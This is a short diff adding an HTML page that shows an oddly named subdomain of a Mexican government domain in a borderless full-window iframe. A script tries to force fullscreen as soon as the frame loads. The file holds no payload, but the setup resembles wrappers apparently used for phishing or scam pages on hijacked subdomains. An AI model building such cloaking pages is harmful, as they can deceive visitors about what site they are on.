@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        #fullscreen-iframe {
+            width: 100%;
+            height: 100vh;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="fullscreen-iframe" src="https://monkeyman12344566444.pagostepeapulco.gob.mx"></iframe>
+
+    <script>
+        const iframe = document.getElementById("fullscreen-iframe");
+        
+        // Attempt to go fullscreen when the iframe is loaded
+        iframe.addEventListener("load", () => {
+            iframe.requestFullscreen = iframe.requestFullscreen || iframe.mozRequestFullScreen || iframe.webkitRequestFullscreen || iframe.msRequestFullscreen;
+            
+            if (iframe.requestFullscreen) {
+                iframe.requestFullscreen();
+            }
+        });
+    </script>
+</body>
+</html>
